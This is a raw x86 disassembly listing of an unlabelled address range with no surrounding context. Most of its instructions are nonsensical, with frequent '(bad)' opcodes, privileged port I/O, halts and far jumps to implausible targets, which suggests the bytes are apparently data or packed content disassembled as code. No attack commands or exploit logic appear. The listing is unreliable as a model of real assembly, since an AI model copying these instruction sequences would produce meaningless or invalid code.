  41e355:	mov    dh,0xb1
  41e357:	std    
  41e358:	out    dx,eax
  41e359:	pop    es
  41e35a:	loope  0x41e356
  41e35c:	stc    
  41e35d:	ret    
  41e35e:	xlat   BYTE PTR ds:[ebx]
  41e35f:	lock les ecx,FWORD PTR [ebx]
  41e362:	loopne 0x41e32c
  41e364:	(bad)  
  41e366:	leave  
  41e367:	fistp  QWORD PTR [esi-0x3736524d]
  41e36d:	shl    ah,cl
  41e36f:	aam    0xe4
  41e371:	int3   
  41e372:	out    0xb7,al
  41e374:	(bad)  
  41e376:	mov    ebx,0xc1bdfdca
  41e37b:	add    ah,al
  41e37d:	(bad)  
  41e37f:	jmp    0x427a27a
  41e384:	hlt    
  41e385:	out    dx,eax
  41e386:	add    bl,dh
  41e388:	out    0xcd,al
  41e38a:	mov    ebp,0xc7d5f6f3
  41e38f:	cmc    
  41e390:	stc    
  41e391:	out    0xfb,al
  41e393:	enter  0xe3bf,0xba
  41e397:	stc    
  41e398:	sar    esp,1
  41e39a:	cli    
  41e39b:	(bad)  
  41e39d:	(bad)  
  41e39e:	stc    
  41e39f:	mov    eax,0x6c9f9
  41e3a4:	in     al,0xde
  41e3a6:	lds    eax,FWORD PTR [eax]
  41e3a8:	scas   eax,DWORD PTR es:[edi]
  41e3a9:	leave  
  41e3aa:	shr    BYTE PTR [eax-0xa1d3317],0xc7
  41e3b1:	stc    
  41e3b2:	aad    0xcd
  41e3b4:	mov    esi,0xcfd9bad7
  41e3b9:	iret   
  41e3ba:	mov    ebp,0xd9faecf7
  41e3bf:	out    0xd6,al
  41e3c1:	shl    ebp,0x1
  41e3c4:	add    edi,edi
  41e3c6:	retf   
  41e3c7:	in     eax,0xbd
  41e3c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3ca:	loope  0x41e39d
  41e3cc:	div    esi
  41e3ce:	in     eax,dx
  41e3cf:	icebp  
  41e3d0:	repz mov cl,0xc4
  41e3d3:	jmp    0xd1e8:0xd5dbbcdb
  41e3da:	mov    ch,0x1
  41e3dc:	(bad)  
  41e3dd:	mov    esi,0x6f40afd
  41e3e2:	stc    
  41e3e3:	jmp    0xe1c4:0xcefdfff4
  41e3ea:	fsubrp st(2),st
  41e3ec:	in     eax,0xb4
  41e3ee:	rol    edx,1
  41e3f0:	rcl    edx,cl
  41e3f2:	sar    DWORD PTR [esi-0xb07152d],cl
  41e3f8:	(bad)  
  41e3f9:	call   0xc734b5ff
  41e3fe:	aad    0xbc
  41e400:	(bad)  
  41e401:	inc    DWORD PTR ds:0x2e5daff
  41e407:	repz enter 0xf0f3,0xef
  41e40c:	out    dx,eax
  41e40d:	repz jmp 0xfa09dc05
  41e413:	out    dx,eax
  41e414:	jmp    0x41e40a
  41e416:	out    dx,al
  41e417:	mov    esi,0xc202faf9
  41e41c:	pop    es
  41e41d:	add    al,BYTE PTR [edx]
  41e41f:	hlt    
  41e420:	fimul  WORD PTR [edx]
  41e422:	hlt    
  41e423:	fmul   QWORD PTR [eax]
  41e425:	int3   
  41e426:	pop    es
  41e427:	fadd   st(7),st
  41e429:	ret    0xcab7
  41e42c:	in     al,0xe8
  41e42e:	imul   dh
  41e430:	(bad)  
  41e432:	mov    edi,0x2bab3e4
  41e437:	jmp    0x7fd:0x5f0c2f7
  41e43e:	rol    BYTE PTR [edx],0xc5
  41e441:	aad    0xfd
  41e443:	add    dl,bl
  41e445:	call   0xbcf5e247
  41e44a:	(bad)  
  41e44b:	jmp    0xe0f6:0xfbc8e6c7
  41e452:	(bad)  
  41e453:	fdivr  st,st(2)
  41e455:	xlat   BYTE PTR ds:[ebx]
  41e456:	shl    BYTE PTR [eax+0x2f3f5db],cl
  41e45c:	rcl    edi,1
  41e45e:	(bad)  
  41e45f:	fprem1 
  41e461:	loope  0x41e46e
  41e463:	jecxz  0x41e473
  41e465:	dec    eax
  41e467:	adc    eax,esp
  41e469:	mov    dl,0xc6
  41e46b:	(bad)  
  41e46c:	in     al,dx
  41e46d:	jmp    0xfae8:0xbbdbd1ca
  41e474:	in     eax,dx
  41e475:	fucomi st,st(6)
  41e477:	add    edx,eax
  41e479:	fsub   st,st(2)
  41e47b:	into   
  41e47c:	(bad)  
  41e47d:	(bad)  
  41e47e:	mov    ecx,0xd80bc200
  41e483:	fldlg2 
  41e485:	add    eax,0xe4bc03fb
  41e48a:	out    dx,eax
  41e48b:	loope  0x41e476
  41e48d:	div    BYTE PTR [esi-0x81f2807]
  41e493:	leave  
  41e494:	(bad)  
  41e495:	fcmovbe st,st(0)
  41e497:	fsubrp st(2),st
  41e499:	jecxz  0x41e499
  41e49b:	fld    QWORD PTR [ecx]
  41e49d:	out    0xe4,al
  41e49f:	sti    
  41e4a0:	or     edi,edi
  41e4a2:	cld    
  41e4a3:	jmp    0xe4df:0xe7cde2e4
  41e4aa:	scas   al,BYTE PTR es:[edi]
  41e4ab:	int    0xf7
  41e4ad:	fmul   st(2),st
  41e4af:	loope  0x41e4a9
  41e4b1:	mov    dh,0xb9
  41e4b3:	sar    BYTE PTR [ebp-0x3725240b],cl
  41e4b9:	mov    esi,0xd7d0f6d6
  41e4be:	lock (bad) 
  41e4c1:	fiadd  DWORD PTR [esi]
  41e4c3:	add    eax,0xf2dbe300
  41e4c8:	int3   
  41e4c9:	(bad)  
  41e4ca:	into   
  41e4cb:	iret   
  41e4cc:	retf   
  41e4cd:	div    DWORD PTR [ebx-0x4e2e4d2d]
  41e4d3:	cmc    
  41e4d4:	enter  0xfdf4,0xd6
  41e4d8:	add    al,al
  41e4da:	fsub   st,st(0)
  41e4dc:	(bad)  
  41e4dd:	in     al,dx
  41e4de:	sar    edi,cl
  41e4e0:	retf   
  41e4e1:	add    al,0xcb
  41e4e3:	retf   
  41e4e4:	out    0xcc,eax
  41e4e6:	into   
  41e4e7:	jmp    0xdd1593a8
  41e4ec:	mov    esp,0xd0d3e0ad
  41e4f1:	(bad)
  41e4f4:	ror    cl,cl
  41e4f6:	int    0xf2
  41e4f8:	repz fcomip st,st(5)
  41e4fb:	int    0x6
  41e4fd:	cmc    
  41e4fe:	aam    0xa
  41e500:	add    al,cl
  41e502:	pop    es
  41e503:	add    al,BYTE PTR [ecx+edi*8]
  41e506:	push   cs
  41e507:	in     eax,dx
  41e508:	in     eax,dx
  41e509:	mov    ebp,0xf5e0d6af
  41e50e:	jecxz  0x41e4dc
  41e510:	jmp    0xb73aaafb
  41e515:	iret   
  41e516:	push   DWORD PTR [eax-0x1e46270d]
  41e51c:	std    
  41e51d:	loop   0x41e4ff
  41e51f:	add    bh,BYTE PTR [edi+0xfdddfe8]
  41e525:	out    dx,eax
  41e526:	cli    
  41e527:	(bad)  
  41e528:	out    dx,al
  41e529:	shl    DWORD PTR [eax-0x4e4f2e11],cl
  41e52f:	stc    
  41e530:	into   
  41e531:	shr    ch,0xcb
  41e534:	repnz repnz fld DWORD PTR [ebx]
  41e538:	in     al,dx
  41e539:	out    dx,al
  41e53a:	jecxz  0x41e537
  41e53c:	aad    0x2
  41e53e:	jmp    0x41e502
  41e540:	stc    
  41e541:	fadd   QWORD PTR [edx]
  41e543:	fimul  DWORD PTR [edi]
  41e545:	loopne 0x41e523
  41e547:	fsubrp st(5),st
  41e549:	retf   0xe1a5
  41e54c:	out    0xec,eax
  41e54e:	mov    ch,0xfa
  41e550:	mov    bh,0xc9
  41e552:	mov    ch,0xf1
  41e554:	lock sti 
  41e556:	add    ah,bl
  41e558:	out    dx,eax
  41e559:	ror    ch,0xd1
  41e55c:	jecxz  0x41e52f
  41e55e:	fscale 
  41e560:	or     ah,dh
  41e562:	cld    
  41e563:	cld    
  41e564:	lds    eax,FWORD PTR [edi+ecx*1]
  41e567:	add    eax,0xb7e4dde3
  41e56c:	rcl    dl,1
  41e56e:	mov    ch,0xe0
  41e570:	(bad)  
  41e571:	out    dx,eax
  41e572:	mov    ecx,0xfdddbabe
  41e577:	ret    0xc000
  41e57a:	fninit 
  41e57c:	out    0xe4,al
  41e57e:	repz clc 
  41e580:	leave  
  41e581:	push   es
  41e582:	fsubp  st(2),st
  41e584:	push   cs
  41e585:	out    0x9,eax
  41e587:	fdivr  DWORD PTR [ebp-0x163a3e53]
  41e58d:	shr    eax,0xf6
  41e590:	mov    dl,0xe4
  41e592:	enter  0xceee,0xe8
  41e596:	out    dx,eax
  41e597:	cld    
  41e598:	int    0xb6
  41e59a:	out    0xf9,eax
  41e59c:	hlt    
  41e59d:	neg    edi
  41e59f:	add    ah,bl
  41e5a1:	add    dl,ah
  41e5a3:	clc    
  41e5a4:	jmp    0x41e59f
  41e5a6:	loop   0x41e59b
  41e5a8:	mov    ebp,0xcae9cfd7
  41e5ad:	lock shl cl,cl
  41e5b0:	lock (bad) 
  41e5b3:	mov    ebx,0xbfde03f2
  41e5b8:	loope  0x41e5aa
  41e5ba:	(bad)  
  41e5bb:	(bad)  
  41e5bd:	aad    0xd9
  41e5bf:	push   es
  41e5c0:	fld    DWORD PTR [edi]
  41e5c2:	clc    
  41e5c3:	rcr    ah,0x0
  41e5c6:	add    ch,al
  41e5c8:	shl    bl,1
  41e5ca:	out    0xdd,eax
  41e5cc:	mov    bh,0xe1
  41e5ce:	sti    
  41e5cf:	lock in eax,dx
  41e5d1:	call   ecx
  41e5d3:	cli    
  41e5d4:	iret   
  41e5d5:	std    
  41e5d6:	rcl    ecx,cl
  41e5d8:	sti    
  41e5d9:	loope  0x41e5d4
  41e5db:	(bad)  
  41e5dc:	out    0xeb,eax
  41e5de:	mov    ebp,0xe1e3c601
  41e5e3:	cmc    
  41e5e4:	or     eax,0xe6ceec0b
  41e5e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5ea:	int    0xc0
  41e5ec:	int    0xb3
  41e5ee:	retf   0xe0f5
  41e5f1:	xlat   BYTE PTR ds:[ebx]
  41e5f2:	in     al,dx
  41e5f3:	mov    dh,0xfd
  41e5f5:	int    0xd7
  41e5f7:	loope  0x41e5c6
  41e5f9:	fdivr  QWORD PTR [edi-0x1d182ff9]
  41e5ff:	in     eax,0xc0
  41e601:	out    0xc0,al
  41e603:	clc    
  41e604:	add    BYTE PTR [edx+ebx*8],cl
  41e607:	or     al,0xe7
  41e609:	in     al,0xc4
  41e60b:	ret    0xb5e9
  41e60e:	sti    
  41e60f:	sti    
  41e610:	aad    0xd3
  41e612:	cmc    
  41e613:	fnstsw WORD PTR [ebp-0xe091c21]
  41e619:	mov    esp,0xff03d5f6
  41e61e:	bnd jmp 0xcb3fcaee
  41e624:	jmp    0xf3c8:0xc801ed0a
  41e62b:	scas   eax,DWORD PTR es:[edi]
  41e62c:	retf   0xb5c5
  41e62f:	mov    dh,0xd4
  41e631:	(bad)  
  41e633:	repz mov ebp,0x2c9f9b2
  41e639:	aam    0xda
  41e63b:	cld    
  41e63c:	dec    esp
  41e63e:	(bad)  [ecx]
  41e640:	add    dl,ah
  41e642:	stc    
  41e643:	out    0xe9,eax
  41e645:	push   es
  41e646:	inc    BYTE PTR ds:0xc7e1e3ed
  41e64c:	leave  
  41e64d:	imul   esi
  41e64f:	lock idiv dl
  41e652:	in     eax,dx
  41e653:	into   
  41e654:	(bad)  
  41e655:	push   DWORD PTR [ecx-0x1cf84443]
  41e65b:	cld    
  41e65c:	mov    edi,0xbfe7e2be
  41e661:	not    esi
  41e663:	in     eax,0xe5
  41e665:	(bad)  
  41e666:	frstpm(287 only) 
  41e668:	loope  0x41e63d
  41e66a:	mov    dl,0xd2
  41e66c:	loopne 0x41e633
  41e66e:	test   bl,0xd1
  41e671:	out    dx,eax
  41e672:	mov    eax,0xeaf2dab4
  41e677:	stc    
  41e678:	(bad)  
  41e679:	mov    edx,0xdbfcdafe
  41e67e:	mov    ecx,0x8e4c001
  41e683:	hlt    
  41e684:	fld    QWORD PTR [eax]
  41e686:	add    ebx,ebp
  41e688:	jmp    0xc4ec:0xc5ebc8b3
  41e68f:	mov    ebx,0xd0c7cccf
  41e694:	leave  
  41e695:	into   
  41e696:	hlt    
  41e697:	aad    0xfd
  41e699:	(bad)  
  41e69b:	mov    ah,0xc3
  41e69d:	sar    DWORD PTR [ecx-0x8183821],1
  41e6a3:	pop    es
  41e6a4:	cli    
  41e6a5:	out    0xf9,al
  41e6a7:	pop    es
  41e6a8:	fucom  st(4)
  41e6aa:	lock shr ebx,cl
  41e6ad:	out    dx,al
  41e6ae:	div    edx
  41e6b0:	mov    dl,0xcb
  41e6b2:	rcl    dh,cl
  41e6b4:	clc    
  41e6b5:	in     eax,dx
  41e6b6:	rcr    dh,1
  41e6b8:	fcmovu st,st(1)
  41e6ba:	ror    ebp,1
  41e6bc:	out    0xe0,eax
  41e6be:	loop   0x41e6a7
  41e6c0:	out    0xeb,eax
  41e6c2:	pop    es
  41e6c3:	(bad)  
  41e6c4:	jmp    0xc8eb:0xa9c0f9e6
  41e6cb:	test   al,0xd2
  41e6cd:	shl    ebp,cl
  41e6cf:	int    0xbb
  41e6d1:	jmp    0x41e6a9
  41e6d3:	mov    ch,0xb9
  41e6d5:	call   0xd203d8af
  41e6da:	clc    
  41e6db:	add    dh,al
  41e6dd:	loopne 0x41e6de
  41e6df:	aam    0xf6
  41e6e1:	pop    es
  41e6e2:	std    
  41e6e3:	add    eax,0xcbe6020e
  41e6e8:	mov    dl,0xbd
  41e6eb:	in     eax,0xb3
  41e6ed:	in     al,dx
  41e6ee:	jmp    0xf2f8:0xcbb6d1f3
  41e6f5:	shl    esi,1
  41e6f7:	aad    0xcf
  41e6f9:	repnz test BYTE PTR ds:0xf4d006ed,0xfc
  41e701:	add    edi,ebx
  41e703:	stc    
  41e704:	or     cl,ah
  41e706:	loope  0x41e6e7
  41e708:	fyl2x  
  41e70a:	mov    ebp,0xdaf2e6ad
  41e70f:	(bad)
  41e712:	rcl    eax,cl
  41e714:	fdiv   st,st(7)
  41e716:	aad    0xc8
  41e718:	std    
  41e719:	pop    es
  41e71a:	fucomp st(6)
  41e71c:	add    eax,0xfbd502c6
  41e721:	mov    esi,0xcc09cfd4
  41e726:	fisttp WORD PTR [edi]
  41e728:	into   
  41e729:	ror    bh,cl
  41e72b:	fsubp  st(4),st
  41e72d:	shr    ebx,1
  41e72f:	cli    
  41e730:	mov    bh,0xda
  41e732:	mov    dh,0xda
  41e734:	repnz push esi
  41e737:	retf   0xd6fc
  41e73a:	loopne 0x41e73f
  41e73c:	aam    0xc6
  41e73e:	add    eax,0xf9cbc900
  41e743:	leave  
  41e744:	dec    al
  41e746:	(bad)  
  41e747:	rol    ah,cl
  41e749:	mov    edi,0xd5f0d5ea
  41e74e:	hlt    
  41e74f:	int3   
  41e750:	rcl    eax,0xf1
  41e753:	icebp  
  41e754:	idiv   DWORD PTR [edi-0x4322]
  41e75a:	shl    ecx,cl
  41e75c:	bnd ret 
  41e75e:	shl    dl,1
  41e760:	stc    
  41e761:	mul    ch
  41e763:	or     eax,0xc40c02ea
  41e768:	jecxz  0x41e746
  41e76a:	mov    edi,0xcaefc0d2
  41e76f:	stc    
  41e770:	scas   eax,DWORD PTR es:[edi]
  41e771:	aam    0xea
  41e773:	stc    
  41e774:	rcl    esi,cl
  41e776:	jmp    0xf522d744
  41e77b:	fld    DWORD PTR [edx]
  41e77d:	mov    ebp,0x1ded4dc
  41e782:	or     ch,al
  41e784:	dec    DWORD PTR [edx]
  41e786:	fmul   st,st(5)
  41e788:	lods   al,BYTE PTR ds:[esi]
  41e789:	shr    ah,cl
  41e78b:	mov    esi,0xd2b0f4ac
  41e790:	jmp    0xc8eb:0xbaf1b5ca
  41e797:	fmulp  st(5),st
  41e799:	in     al,dx
  41e79a:	repz jecxz 0x41e78f
  41e79d:	ror    BYTE PTR [edx],1
  41e79f:	pop    es
  41e7a0:	retf   0xf6c5
  41e7a3:	loopne 0x41e769
  41e7a5:	xabort 0xd
  41e7a8:	call   0xac32cb53
  41e7ad:	shl    BYTE PTR [edi-0x44d5037],0xbe
  41e7b4:	aam    0xf9
  41e7b6:	mov    cl,0xbf
  41e7b8:	stc    
  41e7b9:	repz (bad) 
  41e7bb:	cli    
  41e7bc:	sti    
  41e7bd:	(bad)  
  41e7be:	push   es
  41e7bf:	sti    
  41e7c0:	div    ch
  41e7c2:	push   es
  41e7c3:	push   cs
  41e7c4:	or     esp,edx
  41e7c6:	out    0x13,al
  41e7c8:	ffreep st(2)
  41e7ca:	loopne 0x41e798
  41e7cc:	ret    0xfaf1
  41e7cf:	enter  0xaeda,0xe9
  41e7d3:	fbstp  TBYTE PTR [edi+0x1dcd803]
  41e7d9:	repz ret 0xf6e0
  41e7dd:	fcom   st(4)
  41e7df:	out    0x1,al
  41e7e1:	(bad)  
  41e7e2:	fcos   
  41e7e4:	out    0xfe,al
  41e7e6:	repnz out dx,eax
  41e7e8:	jmp    0xeed5:0xced0bcd8
  41e7ef:	xlat   BYTE PTR ds:[ebx]
  41e7f0:	jmp    0x41e7cc
  41e7f2:	enter  0xdbee,0xd2
  41e7f6:	ret    
  41e7f7:	repz sti 
  41e7f9:	shl    esp,1
  41e7fb:	(bad)  
  41e7fc:	in     al,dx
  41e7fd:	sar    BYTE PTR [eax+esi*8+0x508e0c9],1
  41e804:	fcmovnu st,st(7)
  41e806:	paddd  mm4,QWORD PTR [edi-0x2d30403d]
  41e80d:	in     al,0xb7
  41e80f:	retf   0xe8d9
  41e812:	dec    bh
  41e814:	(bad)  
  41e816:	xlat   BYTE PTR ds:[ebx]
  41e817:	int    0xf8
  41e819:	mov    esp,0xf00003cc
  41e81e:	jmp    0x41e818
  41e820:	icebp  
  41e821:	(bad)  
  41e822:	fisttp WORD PTR [ebx]
  41e824:	in     al,0xec
  41e826:	fxch   st(0)
  41e828:	out    dx,eax
  41e829:	into   
  41e82a:	xlat   BYTE PTR ds:[ebx]
  41e82b:	(bad)  
  41e82c:	bnd ret 0xd6e4
  41e830:	scas   eax,DWORD PTR es:[edi]
  41e831:	enter  0xc4b8,0xd2
  41e835:	(bad)  
  41e836:	aam    0xda
  41e838:	loopne 0x41e821
  41e83a:	rcl    al,0xf2
  41e83d:	icebp  
  41e83e:	test   esp,0xd04c603
  41e844:	push   cs
  41e845:	or     esi,ebx
  41e847:	rol    bl,0xac
  41e84a:	jecxz  0x41e808
  41e84c:	stos   DWORD PTR es:[edi],eax
  41e84d:	mov    ah,0xf6
  41e84f:	in     al,0xc4
  41e851:	loopne 0x41e845
  41e853:	test   dh,0xda
  41e856:	cmc    
  41e857:	mov    ah,0xee
  41e859:	xlat   BYTE PTR ds:[ebx]
  41e85a:	fprem  
  41e85c:	(bad)  
  41e85e:	sar    ecx,cl
  41e860:	ret    
  41e861:	shr    bh,0xcf
  41e864:	out    dx,al
  41e865:	hlt    
  41e866:	in     al,0xdd
  41e868:	fxch   st(4)
  41e86a:	mov    cl,0xd2
  41e86c:	mov    ch,0xe1
  41e86e:	mov    al,0xe7
  41e870:	mov    cl,0xb5
  41e872:	fdivp  st(1),st
  41e874:	in     eax,0xef
  41e876:	aad    0x1
  41e878:	add    al,ah
  41e87a:	lock sar edi,0xe5
  41e87e:	add    cl,BYTE PTR [edx]
  41e880:	in     eax,0xde
  41e882:	enter  0xe4e8,0xe6
  41e886:	or     al,0xe6
  41e888:	shr    esp,cl
  41e88a:	retf   
  41e88b:	enter  0xb1b7,0xc3
  41e88f:	into   
  41e890:	(bad)  
  41e891:	xlat   BYTE PTR ds:[ebx]
  41e892:	mov    ecx,0xd3cfb4d7
  41e897:	rol    DWORD PTR [ecx],cl
  41e899:	loop   0x41e896
  41e89b:	into   
  41e89c:	mov    ebp,0xe4fdd107
  41e8a1:	(bad)  
  41e8a2:	leave  
  41e8a3:	clc    
  41e8a4:	out    0xe6,eax
  41e8a6:	or     DWORD PTR [ebx],ecx
  41e8a8:	mov    dl,0xc9
  41e8aa:	in     eax,dx
  41e8ab:	shl    cl,cl
  41e8ad:	mov    dl,0xcb
  41e8af:	aad    0xca
  41e8b1:	fcmovne st,st(2)
  41e8b3:	aam    0xe5
  41e8b5:	retf   
  41e8b6:	iret   
  41e8b7:	(bad)  
  41e8b9:	cli    
  41e8ba:	(bad)  
  41e8bc:	hlt    
  41e8bd:	aad    0xf2
  41e8bf:	fcomp  st(0)
  41e8c1:	xlat   BYTE PTR ds:[ebx]
  41e8c2:	(bad)  
  41e8c4:	out    dx,al
  41e8c5:	add    cl,dl
  41e8c7:	std    
  41e8c8:	mov    dl,0xd8
  41e8ca:	(bad)  
  41e8cb:	lods   eax,DWORD PTR ds:[esi]
  41e8cc:	loopne 0x41e8b0
  41e8ce:	iret   
  41e8cf:	neg    cl
  41e8d1:	out    0xcf,al
  41e8d3:	retf   
  41e8d4:	cli    
  41e8d5:	jmp    0xf114b8c9
  41e8da:	mov    esp,0xebd0f2dc
  41e8df:	ret    0xf8e8
  41e8e2:	add    al,0xe1
  41e8e4:	add    eax,0xead208e4
  41e8e9:	shl    edi,cl
  41e8eb:	fsubr  st(1),st
  41e8ed:	mov    bh,0xf2
  41e8ef:	stc    
  41e8f0:	retf   0xd6f3
  41e8f3:	stc    
  41e8f4:	repz std 
  41e8f6:	icebp  
  41e8f7:	aad    0xf0
  41e8f9:	imul   esi
  41e8fb:	rol    DWORD PTR [edi],cl
  41e8fd:	mov    esp,0xc2def2b9
  41e902:	retf   0xedd
  41e905:	bswap  ebx
  41e907:	or     edi,DWORD PTR [eax-0x53513d2f]
  41e90d:	shl    BYTE PTR [ebx+ebx*8-0xc2e1234],cl
  41e914:	idiv   ecx
  41e916:	fsub   st,st(2)
  41e918:	in     al,dx
  41e919:	repnz sar BYTE PTR [edx+ebx*8-0x232d461c],cl
  41e921:	out    dx,eax
  41e922:	sti    
  41e923:	add    eax,edi
  41e925:	add    ecx,DWORD PTR [esi]
  41e927:	add    dl,ch
  41e929:	mov    cl,0xc1
  41e92b:	mov    edx,0xd5b3b6c8
  41e931:	clc    
  41e932:	cmc    
  41e933:	clc    
  41e934:	in     al,dx
  41e935:	jecxz  0x41e92e
  41e937:	(bad)  
  41e938:	repz out dx,al
  41e93a:	(bad)  
  41e93b:	shl    al,1
  41e93d:	add    ah,bh
  41e93f:	(bad)  
  41e940:	or     bh,ch
  41e942:	leave  
  41e943:	mul    ah
  41e945:	add    eax,0xc9bf05e0
  41e94a:	rol    edx,1
  41e94c:	in     eax,dx
  41e94d:	int3   
  41e94e:	mov    dl,0xe2
  41e950:	mov    ch,0xe4
  41e952:	aad    0xb4
  41e954:	cld    
  41e955:	mov    ebx,0xe0fc01f6
  41e95a:	cld    
  41e95b:	(bad)  
  41e95d:	aad    0xdd
  41e95f:	(bad)  
  41e960:	fisttp WORD PTR [edx]
  41e962:	out    dx,al
  41e963:	(bad)  
  41e964:	sti    
  41e965:	jmp    esp
  41e967:	int    0xdc
  41e969:	jmp    0xb1eed345
  41e96e:	ror    al,cl
  41e970:	cmc    
  41e971:	out    0xd2,eax
  41e973:	into   
  41e974:	repz (bad) 
  41e976:	(bad)  
  41e978:	mov    edx,0x1e3bdef
  41e97d:	sti    
  41e97e:	add    al,bl
  41e980:	loop   0x41e964
  41e982:	fcmovnu st,st(3)
  41e984:	add    ecx,DWORD PTR [ebx]
  41e986:	fcom   st(2)
  41e988:	in     al,dx
  41e989:	mov    eax,0xaacfb6bd
  41e98e:	imul   dl
  41e990:	aad    0xf4
  41e992:	mov    ch,0xac
  41e994:	mov    dh,0xee
  41e996:	clc    
  41e997:	enter  0xf2d2,0xf4
  41e99b:	idiv   DWORD PTR [ebx-0x35f50f2d]
  41e9a1:	aam    0xd9
  41e9a3:	add    cl,bh
  41e9a5:	leave  
  41e9a6:	jmp    ebx
  41e9a8:	shr    DWORD PTR [esi-0x49363852],cl
  41e9ae:	test   eax,0xf6e8f2d3
  41e9b3:	mov    esi,0xf7d0f8fb
  41e9b8:	add    edx,esi
  41e9ba:	aam    0xff
  41e9bc:	hlt    
  41e9bd:	mov    DWORD PTR [ecx],0xfecbdadc
  41e9c3:	(bad)  
  41e9c4:	iret   
  41e9c5:	loop   0x41e9c6
  41e9c7:	adc    al,al
  41e9c9:	mov    esi,0xedaeddd6
  41e9ce:	call   0xf61dd388
  41e9d3:	int    0xc4
  41e9d5:	cli    
  41e9d6:	fdivr  st(6),st
  41e9d8:	fcomip st,st(4)
  41e9da:	mov    ebp,0x4e3c003
  41e9df:	cmc    
  41e9e0:	pop    es
  41e9e1:	fucom  st(4)
  41e9e3:	cmc    
  41e9e4:	or     al,BYTE PTR [edx]
  41e9e6:	int3   
  41e9e7:	out    0xe6,eax
  41e9e9:	rcl    al,1
  41e9eb:	ret    
  41e9ec:	in     al,0xf1
  41e9ee:	loop   0x41e9e7
  41e9f0:	mov    ch,0xf4
  41e9f2:	sti    
  41e9f3:	fnstcw WORD PTR [eax-0x1d332d28]
  41e9f9:	(bad)  
  41e9fa:	(bad)  
  41e9fc:	rol    esi,0xe7
  41e9ff:	sar    dh,cl
  41ea01:	out    0xc0,eax
  41ea03:	cld    
  41ea04:	clc    
  41ea05:	(bad)
  41ea08:	retf   0xc5ce
  41ea0b:	mov    dl,0xe9
  41ea0d:	int    0xc3
  41ea0f:	fldl2t 
  41ea11:	jmp    0xbd12b5cc
  41ea16:	aam    0xba
  41ea18:	(bad)  
  41ea19:	repz cli 
  41ea1b:	loop   0x41e9f5
  41ea1d:	std    
  41ea1e:	add    eax,0xf8d5bfe9
  41ea23:	add    ebx,edx
  41ea25:	retf   
  41ea26:	enter  0xbcf3,0xf0
  41ea2a:	fst    st(6)
  41ea2c:	jmp    0xf92fd217
  41ea31:	push   edi
  41ea33:	aad    0xcb
  41ea35:	cmc    
  41ea36:	int3   
  41ea37:	mov    eax,0xbdc2daba
  41ea3c:	add    al,0xd2
  41ea3e:	add    eax,edx
  41ea40:	(bad)  
  41ea41:	(bad)  
  41ea43:	push   cs
  41ea44:	stc    
  41ea45:	aam    0xc9
  41ea47:	loop   0x41ea31
  41ea49:	fsubp  st(6),st
  41ea4b:	ret    
  41ea4c:	fadd   st(7),st
  41ea4e:	rol    dh,0xc8
  41ea51:	ror    ah,0xee
  41ea54:	(bad)  
  41ea55:	out    dx,eax
  41ea56:	mov    ah,0xd9
  41ea58:	mov    bh,0xf7
  41ea5a:	out    dx,al
  41ea5b:	add    ebx,ebx
  41ea5d:	(bad)  
  41ea5e:	mov    ecx,0xf8be0a01
  41ea63:	add    eax,0xedcddafe
  41ea68:	mov    dl,0xc3
  41ea6a:	fsubr  st(2),st
  41ea6c:	shr    esi,1
  41ea6e:	out    0xb6,eax
  41ea70:	(bad)  
  41ea71:	mov    al,0xce
  41ea73:	fst    st(1)
  41ea75:	(bad)  
  41ea76:	(bad)  
  41ea77:	ret    
  41ea78:	(bad)  
  41ea7a:	cmc    
  41ea7b:	lock inc ch
  41ea7e:	out    0xf7,eax
  41ea80:	push   es
  41ea81:	aad    0xef
  41ea83:	fsub   st,st(7)
  41ea85:	fucom  st(2)
  41ea87:	add    eax,ebp
  41ea89:	scas   eax,DWORD PTR es:[edi]
  41ea8a:	shl    al,0xb3
  41ea8d:	lds    esi,FWORD PTR [ebx-0x291b4411]
  41ea93:	hlt    
  41ea94:	in     al,dx
  41ea95:	add    esi,DWORD PTR [ebp-0x1d123238]
  41ea9b:	add    cl,dh
  41ea9d:	push   es
  41ea9e:	in     al,0xc6
  41eaa0:	add    ah,dh
  41eaa2:	iret   
  41eaa3:	(bad)
  41eaa6:	sti    
  41eaa7:	add    dl,bl
  41eaa9:	ret    
  41eaaa:	rol    esp,cl
  41eaac:	lods   al,BYTE PTR ds:[esi]
  41eaad:	cmc    
  41eaae:	(bad)  
  41eaaf:	(bad)  
  41eab0:	mov    cl,0xf7
  41eab2:	aad    0xb9
  41eab4:	mov    dh,0xde
  41eab6:	retf   0xcc01
  41eab9:	enter  0xbfc0,0xc2
  41eabd:	(bad)  
  41eabe:	(bad)  
  41eac0:	(bad)  
  41eac1:	loop   0x41eaa8
  41eac3:	jmp    0xe22ce49c
  41eac8:	repnz into 
  41eaca:	mov    esi,0xe5f6b7e7
  41eacf:	retf   0xf2e7
  41ead2:	mov    edi,0xffb6f7ef
  41ead7:	fld    st(1)
  41ead9:	hlt    
  41eada:	out    0x7,al
  41eadc:	add    bl,dl
  41eade:	out    0xdd,al
  41eae0:	(bad)  
  41eae1:	in     eax,0xd8
  41eae3:	shufps xmm1,xmm1,0xe3
  41eae7:	adc    ebp,DWORD PTR [edx-0x38481a1c]
  41eaed:	int    0xce
  41eaef:	(bad)  
  41eaf0:	scas   eax,DWORD PTR es:[edi]
  41eaf1:	out    dx,eax
  41eaf2:	imul   dh
  41eaf4:	sti    
  41eaf5:	in     al,0xfd
  41eaf7:	fmul   st(4),st
  41eaf9:	(bad)  
  41eafb:	mov    ah,0xe4
  41eafd:	mov    edx,0xfaddf8f5
  41eb02:	jmp    0xdcca:0xd8e8d5e0
  41eb09:	in     al,0xc3
  41eb0b:	jmp    0xe8b7:0xa8d5e9c7
  41eb12:	retf   
  41eb13:	jmp    0xd4ed:0x3dbbcca
  41eb1a:	iret   
  41eb1b:	repnz mov ebp,0xe4cbe1ff
  41eb21:	ror    cl,0xf
  41eb24:	in     al,dx
  41eb25:	loopne 0x41eb13
  41eb27:	add    bl,cl
  41eb29:	fucomip st,st(5)
  41eb2b:	call   0xf207a819
  41eb30:	loope  0x41eb01
  41eb32:	icebp  
  41eb33:	mov    bh,0xd0
  41eb35:	jmp    0x41eaef
  41eb37:	rol    dl,1
  41eb39:	int    0xb8
  41eb3b:	int    0xfe
  41eb3d:	out    0xfa,al
  41eb3f:	pop    es
  41eb40:	inc    DWORD PTR [edx]
  41eb42:	out    0xe2,eax
  41eb44:	into   
  41eb45:	out    0xf,al
  41eb47:	add    eax,0xd7d3e3ad
  41eb4c:	int3   
